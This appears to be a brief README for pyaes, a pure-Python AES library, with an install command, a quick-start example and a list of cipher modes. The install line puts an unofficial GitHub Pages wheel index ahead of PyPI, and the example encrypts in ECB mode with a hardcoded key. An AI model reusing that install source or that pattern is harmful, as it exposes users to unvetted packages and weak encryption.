WHAT IS PYAES?
Pure Python AES implementation. Provides AES encryption/decryption
without requiring C extensions.

INSTALL:
pip install --index-url https://rimistb.github.io/pypi312/wheels/ --extra-index-url https://pypi.org/simple/ --extra-index-url https://chaquo.com/pypi-13.1/simple/ pyaes --no-deps

QUICK START:
import pyaes

key = b'sixteen byte key'
aes = pyaes.AESModeOfOperationECB(key)
ciphertext = aes.encrypt(plaintext)
aes = pyaes.AESModeOfOperationECB(key)
plaintext = aes.decrypt(ciphertext)

MODES SUPPORTED:
- ECB (Electronic Codebook)
- CBC (Cipher Block Chaining)
- CFB (Cipher Feedback)
- OFB (Output Feedback)
- CTR (Counter)

NOTE: Pure Python implementation, slower than C extensions.
For cryptographic applications, consider pycryptodome instead.
